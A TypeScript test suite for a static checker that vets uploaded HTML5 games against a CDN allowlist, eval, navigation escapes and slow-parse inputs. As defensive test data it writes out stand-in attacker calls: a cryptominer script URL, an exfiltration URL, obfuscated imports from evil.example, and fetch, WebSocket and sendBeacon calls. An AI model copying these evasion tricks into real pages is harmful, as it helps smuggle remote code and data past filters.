import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import { describe, it } from 'node:test';
import { gameCsp, CSP_SOURCES } from '../../../cdn/csp.mjs';
import { AST_BUDGET, analyzeGame, CONNECT_HOSTS, SCRIPT_HOSTS, STATIC_LIMITS, STYLE_HOSTS, type CheckLevel, type StaticReport } from './static-check.ts';

const FIXTURES = new URL('./fixtures/static-check/', import.meta.url);
const SEED = new URL('../../../seed/games/', import.meta.url);
const load = (name: string) => fs.readFileSync(new URL(name, FIXTURES));
const level = (r: StaticReport, id: string) => r.checks.find((c) => c.id === id)?.level;
const findings = (r: StaticReport, id: string) => r.checks.find((c) => c.id === id)?.findings ?? [];
const nonPass = (r: StaticReport) => Object.fromEntries(r.checks.filter((c) => c.level !== 'pass').map((c) => [c.id, c.level]));
const HOOKS = { 'contract-hooks': 'warn' } as const;

/** Every fixture with the exact non-pass checks it must produce. */
const CASES: Record<string, { status: CheckLevel; expect: Record<string, CheckLevel> }> = {
  'good-minimal-canvas.html': { status: 'pass', expect: {} },
  'good-allowlisted-cdn.html': { status: 'pass', expect: {} },
  'good-esm-importmap.html': { status: 'pass', expect: {} },
  'good-comments-ignored.html': { status: 'pass', expect: {} },
  'bad-remote-script.html': { status: 'fail', expect: { 'script-hosts': 'fail', ...HOOKS } },
  'bad-local-files.html': { status: 'fail', expect: { 'script-hosts': 'fail', 'style-hosts': 'fail', ...HOOKS } },
  'bad-insecure-http-cdn.html': { status: 'fail', expect: { 'script-hosts': 'fail', ...HOOKS } },
  'bad-style-host.html': { status: 'fail', expect: { 'style-hosts': 'fail', ...HOOKS } },
  'bad-import-host.html': { status: 'fail', expect: { 'script-hosts': 'fail', ...HOOKS } },
  'bad-not-a-game.html': { status: 'fail', expect: { 'game-markup': 'fail', ...HOOKS } },
  'bad-js-syntax.html': { status: 'fail', expect: { 'js-syntax': 'fail', ...HOOKS } },
  'warn-frames-forms.html': { status: 'warn', expect: { iframes: 'warn', forms: 'warn', ...HOOKS } },
  'warn-escape-popups-dialogs.html': { status: 'warn', expect: { popups: 'warn', 'top-navigation': 'warn', dialogs: 'warn', ...HOOKS } },
  'warn-network.html': { status: 'warn', expect: { network: 'warn', ...HOOKS } },
  'warn-comment-in-js-string.html': { status: 'warn', expect: { network: 'warn' } },
  'warn-eval.html': { status: 'warn', expect: { eval: 'warn' } },
  'warn-missing-hooks.html': { status: 'warn', expect: { ...HOOKS } },
};

// Bound is deliberately loose (4x the ~500 ms target) so slow or busy CI machines don't flake: a quadratic
// scan over the size cap takes minutes, so this still catches any non-linear regression.
// Under box load both t and the baseline slow down together; a quadratic regression blows past RATIO*baseline even under load.
const ADVERSARIAL_MS = 2000;
// Per-test bound relative to a bare charCodeAt scan of the same input, measured in the same run (so load cancels out).
// Unloaded ratios: js-budget ~200x, everything else <=25x. A quadratic scan (even one strided every 5000 chars) adds >=500x.
const RATIO = 100;

const baselineMs = (input: string): number => {
  let min = Infinity;
  for (let r = 0; r < 3; r++) {
    let sum = 0;
    const t0 = performance.now();
    for (let i = 0; i < input.length; i++) {
      sum += input.charCodeAt(i);
    }
    const ms = performance.now() - t0;
    if (sum < 0) throw new Error('unreachable');
    if (ms < min) min = ms;
  }
  return min;
};

const assertFast = <T>(label: string, input: string, run: () => T, ratio = RATIO): T => {
  const attempts: { t: number; b: number }[] = [];
  let lastRes!: T;
  for (let i = 0; i < 3; i++) {
    const t0 = performance.now();
    lastRes = run();
    const t = performance.now() - t0;
    const b = baselineMs(input);
    attempts.push({ t, b });
    if (t < ADVERSARIAL_MS || t < ratio * b) {
      return lastRes;
    }
  }
  assert.fail(
    `${label} exceeded timing budget in all 3 attempts: ${attempts
      .map((a, i) => `#${i + 1} (t=${a.t.toFixed(1)}ms, b=${a.b.toFixed(1)}ms)`)
      .join(', ')} (limit: < ${ADVERSARIAL_MS}ms or < ${ratio}*b)`
  );
};
describe('static-check fixtures', () => {
  it('covers at least 10 fixtures, all of them on disk', () => {
    const onDisk = fs.readdirSync(FIXTURES).filter((f) => f.endsWith('.html')).sort();
    assert.ok(onDisk.length >= 10);
    assert.deepEqual(onDisk, Object.keys(CASES).sort());
  });
  for (const [name, { status, expect }] of Object.entries(CASES)) {
    it(`${name} -> ${status}`, () => {
      const r = analyzeGame(load(name));
      assert.deepEqual(nonPass(r), expect);
      assert.equal(r.status, status);
    });
  }
});

describe('allowlist comes from the CDN CSP (cdn/csp.mjs)', () => {
  it('derives hosts from CSP_SOURCES', () => {
    assert.deepEqual([...SCRIPT_HOSTS], CSP_SOURCES.script.map((u: string) => new URL(u).hostname));
    assert.deepEqual([...CONNECT_HOSTS], CSP_SOURCES.connect.map((u: string) => new URL(u).hostname));
    assert.ok(STYLE_HOSTS.includes('fonts.googleapis.com') && STYLE_HOSTS.includes('fonts.gstatic.com'));
  });
  it('keeps the production CSP header byte-identical to before the refactor', () => {
    const LIB = 'https://cdn.jsdelivr.net https://unpkg.com https://esm.sh https://cdnjs.cloudflare.com https://ga.jspm.io';
    const before = ['sandbox allow-scripts allow-pointer-lock', "default-src 'none'", `script-src 'unsafe-inline' 'unsafe-eval' data: blob: ${LIB}`,
      `style-src 'unsafe-inline' ${LIB} https://fonts.googleapis.com`, `font-src data: ${LIB} https://fonts.gstatic.com`, `img-src data: blob: ${LIB}`,
      'media-src data: blob:', `connect-src data: blob: ${LIB}`, 'worker-src blob:', "form-action 'none'", "base-uri 'none'", 'frame-ancestors X'].join('; ');
    assert.equal(gameCsp('X'), before);
  });
});

describe('static-check details', () => {
  it('counts the SDK guide hook calls (window.Meshground?.ready?.()) and the old Meshgrounds alias', () => {
    const hooks = (js: string) => findings(analyzeGame(`<canvas></canvas><script>${js}</script>`), 'contract-hooks');
    const all = (ns: string) => `${ns}?.ready?.();${ns}?.onPause?.(() => {});${ns}?.onResume?.(() => {});`;
    assert.deepEqual(hooks(all('window.Meshground')), []);
    assert.deepEqual(hooks(all('window.Meshgrounds')), []);
    assert.deepEqual(hooks('window.Meshground?.ready?.();'), ['Meshground.onPause', 'Meshground.onResume']);
  });
  it('never fails the three seed games', () => {
    for (const f of fs.readdirSync(SEED)) assert.notEqual(analyzeGame(fs.readFileSync(new URL(f, SEED))).status, 'fail', f);
  });
  it('reports the offending URLs', () => {
    assert.deepEqual(findings(analyzeGame(load('bad-remote-script.html')), 'script-hosts'), ['https://evil.example.com/miner.js']);
    assert.deepEqual(findings(analyzeGame(load('bad-local-files.html')), 'script-hosts').sort(), ['./levels.js', 'game.js']);
    assert.deepEqual(findings(analyzeGame(load('bad-import-host.html')), 'script-hosts'), [
      'https://my-backend.example.net/engine.mjs',
      'https://raw.githubusercontent.com/someone/repo/main/x.js',
    ]);
    assert.deepEqual(findings(analyzeGame(load('bad-style-host.html')), 'style-hosts'), [
      'https://use.typekit.net/abc1234.css',
      'https://example.org/theme.css',
      'https://images.example.org/bg.png',
    ]);
    assert.equal(findings(analyzeGame(load('warn-network.html')), 'network').length, 5);
    assert.deepEqual(findings(analyzeGame(load('warn-comment-in-js-string.html')), 'network'), ['https://evil.example.com/exfil?d=']);
  });
  it('still hides real HTML comments (markup level only)', () => {
    assert.equal(level(analyzeGame(load('good-comments-ignored.html')), 'script-hosts'), 'pass');
  });
  it('fails files over the size cap without analysing them and warns over 1 MB', () => {
    const pad = (n: number) => `<!doctype html><canvas></canvas><script>/*${'x'.repeat(n)}*/</script>`;
    const huge = analyzeGame(pad(STATIC_LIMITS.maxBytes + 1));
    assert.equal(huge.status, 'fail');
    assert.deepEqual(huge.checks.map((c) => c.id), ['size']);
    assert.equal(level(analyzeGame(pad(STATIC_LIMITS.warnBytes + 1)), 'size'), 'warn');
  });
  it('fails non-UTF-8 bytes and stops early', () => {
    const r = analyzeGame(new Uint8Array([0x3c, 0x73, 0xff, 0xfe, 0x3e]));
    assert.equal(level(r, 'utf8'), 'fail');
    assert.equal(r.checks.length, 2);
  });
  it('rejects allowlisted look-alike hosts', () => {
    const r = analyzeGame('<canvas></canvas><script src="https://cdn.jsdelivr.net.evil.com/x.js"></script><script src="https://unpkg.com@evil.com/x.js"></script>');
    assert.equal(level(r, 'script-hosts'), 'fail');
    assert.equal(findings(r, 'script-hosts').length, 2);
  });
  it('ignores non-JS script blocks (shaders, JSON data)', () => {
    const r = analyzeGame('<canvas></canvas><script type="x-shader/x-vertex">void main() { gl_Position = vec4(0.); }</script><script type="application/json">{"a":1}</script>');
    assert.equal(level(r, 'js-syntax'), 'pass');
  });
});

describe('static-check scales linearly on large valid JS (acorn-bound)', () => {
  // Valid, dense JS must be fully parsed by acorn. That is O(n) but not free (~0.1-0.5 s per MB depending on
  // node density), so for these cases assert linear growth (4x input -> < 6x time) and a 1 MB budget.
  const time = (input: string) => { const t0 = performance.now(); analyzeGame(input); return performance.now() - t0; };
  const CASES: Record<string, (bytes: number) => string> = {
    'many fetch() calls': (b) => '<canvas></canvas><script>' + "fetch('https://x.example/a');".repeat(Math.floor(b / 29)) + '</script>',
    'long member chain x.a.a.a…': (b) => '<script>x' + '.a'.repeat(Math.floor(b / 2)) + ';</script>',
    'many Meshground.* members': (b) => '<script>' + 'Meshground.ready;'.repeat(Math.floor(b / 18)) + '</script>',
  };
  for (const [name, make] of Object.entries(CASES)) {
    it(`${name}: near the size cap < 6x the 1 MB time, 1 MB < ${ADVERSARIAL_MS / 2} ms`, () => {
      time(make(256 * 1024)); // warm up the JIT
      const one = time(make(1024 * 1024));
      // Wrappers around the payload must stay inside the cap, or analyzeGame returns before the walk.
      const nearCap = STATIC_LIMITS.maxBytes - 128;
      const near = time(make(nearCap));
      assert.ok(one < ADVERSARIAL_MS / 2, `1 MB: ${one.toFixed(0)} ms`);
      assert.ok(near < one * 6, `1 MB ${one.toFixed(0)} ms vs near-cap ${near.toFixed(0)} ms`);
      assert.notEqual(level(analyzeGame(make(nearCap)), 'size'), 'fail');
    });
  }
});

describe('static-check is linear on adversarial input (size cap, < ADVERSARIAL_MS each)', () => {
  const FIVE_MB = STATIC_LIMITS.maxBytes;
  const fill = (prefix: string, unit: string, suffix = '') => {
    const body = unit.repeat(Math.floor((FIVE_MB - prefix.length - suffix.length) / unit.length));
    return prefix + body + suffix;
  };
  const CASES: Record<string, string> = {
    'repeated `import a,` in a module': fill('<script type="module">', 'import a,'),
    'repeated `import a,` unterminated script': fill('<script>', 'import a,'),
    'unclosed `<link rel=stylesheet `': fill('', '<link rel=stylesheet '),
    'unclosed `<link rel=stylesheet ` after a valid tag': fill('<canvas>', '<link rel=stylesheet href=x '),
    'many `<!--` without close': fill('<canvas>', '<!--'),
    'many `<script` openers': fill('', '<script'),
    'many attributes on one tag': fill('<div ', 'a=b '),
    'unterminated quoted attribute': fill('<div a="', 'x'),
    'CSS `url(` without close': fill('<style>', 'url('),
    'CSS `@import` repeated': fill('<style>', '@import '),
    'many inline handlers': fill('', '<b onclick="a(">'),
    'deeply nested parens': fill('<script>', '('),
    'deeply nested arrays': fill('<script>x=', '[', '</script>'),
    'many `<` characters': fill('', '<'),
  };
  for (const [name, input] of Object.entries(CASES)) {
    it(name, () => {
      assert.ok(new TextEncoder().encode(input).length <= FIVE_MB);
      assertFast(name, input, () => analyzeGame(input));
    });
  }
});

describe('Edge CPU budget: AST phase is capped, hard fails stay unconditional', () => {
  const MB = 1024 * 1024;
  const fill = (unit: string, size: number) => unit.repeat(Math.floor(size / unit.length));
  const warns = (r: StaticReport) => r.checks.filter((c) => c.level === 'warn').map((c) => c.id);

  it('member chain just under the size cap finishes under 1 s total', () => {
    const html = `<canvas></canvas><script>x${fill('.a', STATIC_LIMITS.maxBytes - 64)}</script>`;
    assert.ok(html.length <= STATIC_LIMITS.maxBytes, String(html.length));
    const r = assertFast('member chain just under the size cap finishes under 1 s total', html, () => analyzeGame(html));
    assert.notEqual(r.status, 'fail');
  });
  it('inline <script> blocks just under the size cap finish under 1 s total', () => {
    const unit = '<script>a</script>';
    const html = unit.repeat(Math.floor(STATIC_LIMITS.maxBytes / unit.length));
    assert.ok(html.length > STATIC_LIMITS.maxBytes - unit.length && html.length <= STATIC_LIMITS.maxBytes, String(html.length));
    const r = assertFast('inline <script> blocks just under the size cap finish under 1 s total', html, () => analyzeGame(html));
    assert.notEqual(r.status, 'fail');
  });
  it('JS just under the byte budget is fully analysed in under 1 s', () => {
    const input = `<canvas></canvas><script>${fill('var a=b+c*d(e,f);', AST_BUDGET.maxJsBytes - 64)}</script>`;
    // AST_BUDGET.ms is a wall-clock guard, so a busy box trips it and flakes this test. Here we test the byte cap
    // (just under it => full analysis, no skip) and speed (assertFast, load-relative); widen only the wall-clock cap.
    const savedMs = AST_BUDGET.ms;
    AST_BUDGET.ms = ADVERSARIAL_MS * 5;
    try {
      const r = assertFast('JS just under the byte budget is fully analysed in under 1 s', input, () => analyzeGame(input), 600);
      assert.equal(level(r, 'deep-analysis'), undefined);
    } finally {
      AST_BUDGET.ms = savedMs;
    }
  });
  it('over budget: exactly one warning "deep analysis skipped (too large)", never a fail', () => {
    const r = analyzeGame(`<canvas></canvas><script>${fill('var a=b+c*d(e,f);', 3 * MB)}</script>`);
    const deep = r.checks.find((c) => c.id === 'deep-analysis');
    assert.equal(deep?.level, 'warn');
    assert.equal(deep?.message, 'deep analysis skipped (too large)');
    assert.deepEqual(warns(r).filter((id) => id !== 'size'), ['deep-analysis']);
    assert.equal(r.status, 'warn');
  });
  it('over budget: a non-allowlisted import is still a hard fail (lexical fallback)', () => {
    const big = fill('var a=b+c*d(e,f);', 3 * MB);
    const r = analyzeGame(`<canvas></canvas><script type="module">import x from "https://evil.example/x.js";${big}</script>`);
    assert.equal(level(r, 'script-hosts'), 'fail');
    assert.ok(findings(r, 'script-hosts').includes('https://evil.example/x.js'));
    const r2 = analyzeGame(`<canvas></canvas><script src="https://evil.example/a.js"></script><script>${big}</script>`);
    assert.equal(level(r2, 'script-hosts'), 'fail');
  });
  it('size, UTF-8 and markup fails do not depend on the AST phase', () => {
    assert.equal(level(analyzeGame('x'.repeat(STATIC_LIMITS.maxBytes + 1)), 'size'), 'fail');
    assert.equal(level(analyzeGame(new Uint8Array([0x3c, 0xff, 0xfe])), 'utf8'), 'fail');
    assert.equal(level(analyzeGame(`<p>${fill('hello ', 3 * MB)}</p>`), 'game-markup'), 'fail');
  });
});

describe('inline scripts are parsed in one pass, with exact per-script errors', () => {
  it('two scripts with unbalanced braces that cancel out are still a syntax fail', () => {
    const r = analyzeGame('<canvas></canvas><script>function f(){</script><script>}</script>');
    assert.equal(level(r, 'js-syntax'), 'fail');
  });
  it('reports the right script among many', () => {
    const blocks = Array.from({ length: 500 }, (_, i) => (i === 321 ? '<script>let = ;</script>' : `<script>var v${i}=${i};</script>`)).join('');
    const r = analyzeGame(`<canvas></canvas>${blocks}`);
    assert.equal(level(r, 'js-syntax'), 'fail');
    assert.ok(findings(r, 'js-syntax').some((f) => f.startsWith('<script> #322:')), findings(r, 'js-syntax').join(' | '));
  });
  it('separate scripts may reuse let/const names (each is its own block)', () => {
    const r = analyzeGame('<canvas></canvas><script>let a=1;</script><script>let a=2;</script>');
    assert.equal(level(r, 'js-syntax'), 'pass');
  });
  it('a classic script using import syntax still falls back to a module parse', () => {
    const r = analyzeGame('<canvas></canvas><script>var a=1;</script><script>import "https://cdn.jsdelivr.net/npm/three/+esm"; a++;</script><script>var b;</script>');
    assert.equal(level(r, 'js-syntax'), 'pass');
  });
  it('warnings from every script are still collected', () => {
    const r = analyzeGame('<canvas></canvas><script>eval("1")</script><script>alert(1)</script>');
    assert.equal(level(r, 'eval'), 'warn');
    assert.equal(level(r, 'dialogs'), 'warn');
  });
});

describe('top-navigation: parent.postMessage is not navigation', () => {
  for (const name of ['stack-tower.html', 'neon-lanes.html', 'prism-pop.html']) {
    it(`seed ${name} has no top-navigation warning`, () => {
      const r = analyzeGame(fs.readFileSync(new URL(name, SEED)));
      assert.equal(level(r, 'top-navigation'), 'pass', JSON.stringify(findings(r, 'top-navigation')));
    });
  }
  it('postMessage passes; real escapes still warn', () => {
    assert.equal(level(analyzeGame('<canvas></canvas><script>parent.postMessage({t:1},"*");window.parent.postMessage(1,"*")</script>'), 'top-navigation'), 'pass');
    for (const js of ['top.location="x"', 'parent.location.href="x"', 'window.top.document', 'frameElement.remove()'])
      assert.equal(level(analyzeGame(`<canvas></canvas><script>${js}</script>`), 'top-navigation'), 'warn', js);
  });
});

describe('SP-4 QA: budget-skipped files cannot slip past the text-scan fallback', () => {
  const MB2 = 1024 * 1024;
  const PAD = 'var a=b+c*d(e,f);'.repeat(Math.ceil((1.4 * MB2) / 17)); // > AST_BUDGET.maxJsBytes on its own
  const EVIL = 'https://evil.example/x.js';
  const page = (js: string, attrs = '') => `<canvas></canvas><script${attrs}>${PAD}\n${js}</script>`;
  const deep = (r: StaticReport) => level(r, 'deep-analysis');
  const scriptFail = (html: string, why: string) => {
    const r = analyzeGame(html);
    assert.equal(deep(r), 'warn', `${why}: budget should be exceeded`);
    assert.equal(level(r, 'script-hosts'), 'fail', `${why}: ${JSON.stringify(findings(r, 'script-hosts'))}`);
    return r;
  };

  it('more than 130k import strings in a skipped file: no RangeError, fails closed', () => {
    const many = "import'./a';".repeat(140_000); // 1.68 MB, over the byte budget
    let r: StaticReport | undefined;
    assert.doesNotThrow(() => { r = analyzeGame(`<canvas></canvas><script type="module">${many}</script>`); });
    assert.equal(level(r!, 'script-hosts'), 'fail');
    assert.ok(findings(r!, 'script-hosts').length <= 10);
    const r2 = analyzeGame(`<canvas></canvas><script>${"x=import('./a');".repeat(140_000)}</script>`);
    assert.equal(level(r2, 'script-hosts'), 'fail');
  });

  const COMMENT_CASES: [string, string][] = [
    ['import/*c*/(url)', `import/*c*/('${EVIL}')`],
    ['import(//c\\n url)', `import(//c\n'${EVIL}')`],
    ['import x from/*c*/url', `import x from/*c*/'${EVIL}'`],
    ['import/*c*/url', `import/*c*/'${EVIL}'`],
    ['export*from/*c*/url', `export*from/*c*/'${EVIL}'`],
    ['escaped slashes \\/', `import('https:\\/\\/evil.example\\/x.js')`],
    ['\\xNN escapes', `import('\\x68ttps://evil\\x2eexample/x.js')`],
    ['legacy octal escapes', `import('\\150ttps://evil.example/x.js')`],
    ['legacy octal 2-digit + \\0', `import('h\\164tps:\\57/evil\\56example/x.js\\0')`],
    ['\\uNNNN escapes', `import('\\u0068ttps://evil.example/x.js')`],
    ['newline padding', `import\n\n(\n'${EVIL}'\n)`],
  ];
  for (const [name, js] of COMMENT_CASES) {
    it(`catches ${name} after the budget`, () => {
      const r = scriptFail(page(js, js.includes('export') || js.includes(' from') || js.startsWith('import/*c*/\'') ? ' type="module"' : ''), name);
      assert.ok(findings(r, 'script-hosts').some((f) => f.includes('evil.example')), JSON.stringify(findings(r, 'script-hosts')));
    });
  }

  it('catches import() inside inline event handlers (plain and entity-encoded) after the budget', () => {
    scriptFail(`<canvas onclick="import('${EVIL}')"></canvas><script>${PAD}</script>`, 'handler');
    scriptFail(`<canvas onclick="import(&quot;https:&#x2F;&#x2F;evil.example/x.js&quot;)"></canvas><script>${PAD}</script>`, 'entity handler');
    scriptFail(`<canvas onclick="import(/*c*/'${EVIL}')"></canvas><script>${PAD}</script>`, 'handler comment');
  });

  it('fails closed on imports it cannot resolve once the budget is hit', () => {
    for (const js of ["import(base + 'x.js')", 'import(u)', 'import(`${cdn}/x.js`)', 'const f = `${import(u)}`;', `import('${'a'.repeat(5000)}')`]) {
      const r = scriptFail(page(js), js.slice(0, 30));
      assert.ok(findings(r, 'script-hosts').some((f) => f.startsWith('unresolved:')), js.slice(0, 30));
    }
  });

  it('does not invent findings from comments or strings', () => {
    const js = `// import('${EVIL}')\n/* fetch('${EVIL}') */ var s = "import(x) fetch('${EVIL}') eval(1) alert(1) top.location";`;
    const r = analyzeGame(page(js));
    assert.equal(deep(r), 'warn');
    assert.equal(level(r, 'script-hosts'), 'pass', JSON.stringify(findings(r, 'script-hosts')));
    for (const id of ['network', 'eval', 'dialogs', 'top-navigation']) assert.equal(level(r, id), 'pass', id);
  });

  it('allowlisted imports after the budget still pass', () => {
    const r = analyzeGame(page("import('https://cdn.jsdelivr.net/npm/three/+esm')"));
    assert.equal(deep(r), 'warn');
    assert.equal(level(r, 'script-hosts'), 'pass');
  });

  it('a syntax error in a small script stays a fail when another script blows the budget', () => {
    const r = analyzeGame(`<canvas></canvas><script>let = ;</script><script>${PAD}</script>`);
    assert.equal(deep(r), 'warn');
    assert.equal(level(r, 'js-syntax'), 'fail');
    const r2 = analyzeGame(`<canvas></canvas><script>${PAD}</script><script>function(</script>`);
    assert.equal(level(r2, 'js-syntax'), 'fail');
  });

  it('eval, popups, top-navigation and dialogs keep their warning when skipped', () => {
    const cases: Record<string, string> = {
      eval: 'eval(/*c*/"1")', popups: 'window . open("x")', 'top-navigation': 'top /*c*/ .location = "x"', dialogs: 'alert//c\n(1)',
    };
    for (const [id, js] of Object.entries(cases)) {
      const r = analyzeGame(page(js));
      assert.equal(deep(r), 'warn', id);
      assert.equal(level(r, id), 'warn', `${id}: ${JSON.stringify(r.checks.find((c) => c.id === id))}`);
    }
    // Same in a small script that was parsed before the big one ran out the budget.
    const r = analyzeGame(`<canvas></canvas><script>eval("1");alert(1)</script><script>${PAD}</script>`);
    assert.equal(level(r, 'eval'), 'warn');
    assert.equal(level(r, 'dialogs'), 'warn');
  });

  it('flags fetch / WebSocket / sendBeacon to bad hosts after the padding', () => {
    for (const js of [`fetch( /*c*/ 'https://evil.example/api')`, `fetch('https:\\/\\/evil.example/api')`, `new WebSocket("wss://evil.example/s")`, `navigator.sendBeacon('https://evil.example/b', d)`, `xhr.open('GET', 'https://evil.example/x')`]) {
      const r = analyzeGame(page(js));
      assert.equal(level(r, 'network'), 'warn', js);
      assert.ok(findings(r, 'network').some((f) => f.includes('evil.example')), js);
    }
    assert.equal(level(analyzeGame(page("fetch('https://cdn.jsdelivr.net/x.json')")), 'network'), 'pass');
  });

  it('flags parent["location"]= (AST and text scan)', () => {
    for (const js of ['parent["location"] = "x"', "top['location'].href='x'", 'window.parent["document"]'])
      assert.equal(level(analyzeGame(`<canvas></canvas><script>${js}</script>`), 'top-navigation'), 'warn', js);
    assert.equal(level(analyzeGame(page('parent [ "location" ] = "x"')), 'top-navigation'), 'warn');
    assert.equal(level(analyzeGame('<canvas></canvas><script>parent["postMessage"](1,"*")</script>'), 'top-navigation'), 'pass');
  });

  it('entity-encoded attribute URLs are decoded before the host check (no budget needed)', () => {
    const r = analyzeGame('<canvas></canvas><script src="https:&#x2F;&#x2F;evil.example/a.js"></script>');
    assert.ok(findings(r, 'script-hosts').includes('https://evil.example/a.js'));
  });

  it('the whole fallback stays fast just under the size cap (loose CI bound)', () => {
    const unit = 'var a=b+c*d(e,f);/*x*/"s\\x41";';
    const budget = STATIC_LIMITS.maxBytes - 64;
    const big = `<canvas></canvas><script>${unit.repeat(Math.floor(budget / unit.length))}</script>`;
    assert.ok(new TextEncoder().encode(big).length <= STATIC_LIMITS.maxBytes, String(big.length));
    assertFast('the whole fallback stays fast just under the size cap (loose CI bound)', big, () => analyzeGame(big));
  });
});

// Strict check against the production wall-clock cap, only meaningful on an idle box (skipped otherwise, and on busy CI).
// Unloaded the byte-budget input takes ~300 ms here (432 ms seen earlier on a busier box); the bound is 0.75 x 600 = 450 ms:
// 1.5x headroom over today's median, still 150 ms short of the cap, and any 3x linear slowdown (>= 900 ms) lands far past it.
describe('strict unloaded timing vs AST_BUDGET', () => {
  const cpus = os.cpus().length;
  const loadavg1 = os.loadavg()[0];
  // Absolute wall-clock bounds are not meaningful on shared CI runners.
  const skip = process.env.CI
    ? `CI=${process.env.CI}: strict absolute timing vs AST_BUDGET is not meaningful on shared CI runners; runs locally on idle boxes`
    : loadavg1 > 0.5 * cpus
      ? `box loaded: loadavg1=${loadavg1.toFixed(2)} > 0.5 x ${cpus} cpus; strict timing is only valid unloaded`
      : false;
  const BOUND_MS = 0.75 * AST_BUDGET.ms;
  const fill = (unit: string, size: number) => unit.repeat(Math.floor(size / unit.length));
  const input = `<canvas></canvas><script>${fill('var a=b+c*d(e,f);', AST_BUDGET.maxJsBytes - 64)}</script>`;
  const medianOf = (runs: number, work: () => void) => {
    work(); // warm-up
    const times: number[] = [];
    for (let i = 0; i < runs; i++) {
      const t0 = performance.now();
      work();
      times.push(performance.now() - t0);
    }
    return { median: [...times].sort((a, b) => a - b)[Math.floor(runs / 2)], times };
  };
  const fmt = (ts: number[]) => ts.map((t) => t.toFixed(0)).join(', ');

  it(`byte-budget input is fully analysed with median < 0.75 x AST_BUDGET.ms (${BOUND_MS} ms)`, { skip }, () => {
    let report: StaticReport | undefined;
    const { median, times } = medianOf(5, () => { report = analyzeGame(input); });
    assert.ok(median < BOUND_MS, `median ${median.toFixed(0)} ms >= ${BOUND_MS} ms; runs [${fmt(times)}]`);
    assert.equal(level(report!, 'deep-analysis'), undefined);
  });

  it('a 3x linear slowdown is caught (relative, machine-speed independent)', { skip }, () => {
    // Same run, same machine: tripling the work must at least double the median, so the timing really tracks the
    // analysis cost. No absolute bound here; test 1 owns the 450 ms limit (a fast box would make 3x < 450 ms).
    const one = medianOf(5, () => { analyzeGame(input); });
    const three = medianOf(5, () => { analyzeGame(input); analyzeGame(input); analyzeGame(input); });
    assert.ok(three.median >= 2 * one.median,
      `3x median ${three.median.toFixed(0)} ms < 2 x 1x median ${one.median.toFixed(0)} ms; 1x [${fmt(one.times)}], 3x [${fmt(three.times)}]`);
  });
});
